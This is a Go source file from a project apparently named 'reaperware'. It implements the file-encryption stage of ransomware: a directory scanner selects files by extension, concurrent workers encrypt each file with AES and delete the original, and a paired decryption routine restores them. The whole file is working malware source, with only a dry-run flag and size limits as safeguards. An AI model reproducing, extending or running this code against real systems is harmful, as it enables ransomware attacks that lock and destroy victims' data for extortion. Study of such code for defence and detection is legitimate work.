package filedirectory

import (
	"context"
	"log"
	"os"
	"strings"
	"sync"

	"reaperware/pkg/aeskeys"
	"reaperware/pkg/config"
)

// FileTask represents the information needed to encrypt or decrypt a single file.
type FileTask struct {
	InputFilePath  string
	OutputFilePath string
	DecryptedPath  string
}

// encryptFileTask processes a single file encryption task
func encryptFileTask(ctx context.Context, task FileTask, aesKey []byte, id int, cfg *config.Run, report *ResultReport) {
	select {
	case <-ctx.Done():
		report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "encrypt", OK: false, Err: ctx.Err(), DryRun: cfg.DryRun})
		return
	default:
	}

	if cfg.DryRun {
		log.Printf("[dry-run] [Worker %d] would encrypt: %s\n", id, task.InputFilePath)
		report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "encrypt", OK: true, DryRun: true})
		return
	}

	fileEncryptor := aeskeys.NewEncryptor(aesKey, task.InputFilePath, task.OutputFilePath, task.DecryptedPath)
	fileEncryptor.MaxPlaintextBytes = cfg.MaxFileSize

	if err := fileEncryptor.Encrypt(id); err != nil {
		log.Printf("[-] [Worker %d] Failed to encrypt %s: %v\n", id, task.InputFilePath, err)
		skipped := strings.Contains(err.Error(), "too large")
		report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "encrypt", OK: false, Err: err, Skipped: skipped, Reason: err.Error(), DryRun: false})
		return
	}
	log.Printf("[+] [Worker %d] File %s encrypted successfully\n", id, task.InputFilePath)
	report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "encrypt", OK: true, DryRun: false})

	err := os.Remove(task.InputFilePath)
	if err != nil {
		log.Printf("[-] [Worker %d] Error deleting file %s: %v\n", id, task.InputFilePath, err)
	} else {
		log.Printf("[+] [Worker %d] Original file %s deleted successfully\n", id, task.InputFilePath)
	}
}

func workerEncrypt(ctx context.Context, id int, aesKey []byte, jobs <-chan FileTask, wg *sync.WaitGroup, cfg *config.Run, report *ResultReport) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			return
		case task, ok := <-jobs:
			if !ok {
				return
			}
			log.Printf("[+] [Worker %d] Encrypting file: %s\n", id, task.InputFilePath)
			encryptFileTask(ctx, task, aesKey, id, cfg, report)
		}
	}
}

// EncryptFilesInParallel encrypts multiple files concurrently with cancellation and reporting.
func EncryptFilesInParallel(ctx context.Context, aesKey []byte, files []FileTask, cfg *config.Run, report *ResultReport) {
	if cfg.Workers < 1 {
		cfg.Workers = 1
	}
	var wg sync.WaitGroup
	jobs := make(chan FileTask, minInt(len(files), 1024))

	for i := 0; i < cfg.Workers; i++ {
		wg.Add(1)
		go workerEncrypt(ctx, i, aesKey, jobs, &wg, cfg, report)
	}

send:
	for _, file := range files {
		select {
		case <-ctx.Done():
			break send
		case jobs <- file:
		}
	}
	close(jobs)
	wg.Wait()
}

// DecryptFileTask runs AES-GCM decryption for one file.
func DecryptFileTask(ctx context.Context, aesKey []byte, task FileTask, id int, cfg *config.Run, report *ResultReport) {
	select {
	case <-ctx.Done():
		report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "decrypt", OK: false, Err: ctx.Err(), DryRun: cfg.DryRun})
		return
	default:
	}

	if cfg.DryRun {
		log.Printf("[dry-run] [Worker %d] would decrypt: %s\n", id, task.InputFilePath)
		report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "decrypt", OK: true, DryRun: true})
		return
	}

	decryptor, err := aeskeys.NewAESDecryptor(aesKey, task.InputFilePath, cfg.MaxFileSize)
	if err != nil {
		log.Printf("[-] [Worker %d] Failed to initialize decryptor for %s: %v\n", id, task.InputFilePath, err)
		skipped := strings.Contains(err.Error(), "too large")
		report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "decrypt", OK: false, Err: err, Skipped: skipped, DryRun: false})
		return
	}
	if err := decryptor.DecryptFile(task.DecryptedPath, id); err != nil {
		log.Printf("[-] [Worker %d] Failed to decrypt %s: %v\n", id, task.InputFilePath, err)
		skipped := strings.Contains(err.Error(), "too large")
		report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "decrypt", OK: false, Err: err, Skipped: skipped, DryRun: false})
		return
	}

	report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "decrypt", OK: true, DryRun: false})

	err = os.Remove(task.InputFilePath)
	if err != nil {
		log.Printf("[-] [Worker %d] Error deleting file %s: %v\n", id, task.InputFilePath, err)
	} else {
		log.Printf("[+] [Worker %d] Original file %s deleted successfully\n", id, task.InputFilePath)
	}
}

func workerDecrypt(ctx context.Context, id int, aesKey []byte, jobs <-chan FileTask, wg *sync.WaitGroup, cfg *config.Run, report *ResultReport) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			return
		case task, ok := <-jobs:
			if !ok {
				return
			}
			log.Printf("[Worker %d] Decrypting file: %s\n", id, task.InputFilePath)
			DecryptFileTask(ctx, aesKey, task, id, cfg, report)
		}
	}
}

// DecryptFilesInParallel decrypts multiple files concurrently.
func DecryptFilesInParallel(ctx context.Context, aesKey []byte, files []FileTask, cfg *config.Run, report *ResultReport) {
	if cfg.Workers < 1 {
		cfg.Workers = 1
	}
	var wg sync.WaitGroup
	jobs := make(chan FileTask, minInt(len(files), 1024))

	for i := 0; i < cfg.Workers; i++ {
		wg.Add(1)
		go workerDecrypt(ctx, i, aesKey, jobs, &wg, cfg, report)
	}

send:
	for _, file := range files {
		select {
		case <-ctx.Done():
			break send
		case jobs <- file:
		}
	}
	close(jobs)
	wg.Wait()
}

// EncryptTheFiles finds files under rootDir and encrypts them.
func EncryptTheFiles(ctx context.Context, rootDir string, aesKey []byte, cfg *config.Run, report *ResultReport) error {
	fileScanner := NewFileScanner(rootDir, Extensions, ExcludedDirs, cfg.MaxFileSize)
	fileScanner.Start(ctx)
	if err := ctx.Err(); err != nil {
		return err
	}

	fileTasks := fileScanner.ToFileTasks()
	EncryptFilesInParallel(ctx, aesKey, fileTasks, cfg, report)

	if err := ctx.Err(); err != nil {
		return err
	}
	log.Println("[+] Encryption pass finished.")
	return nil
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}
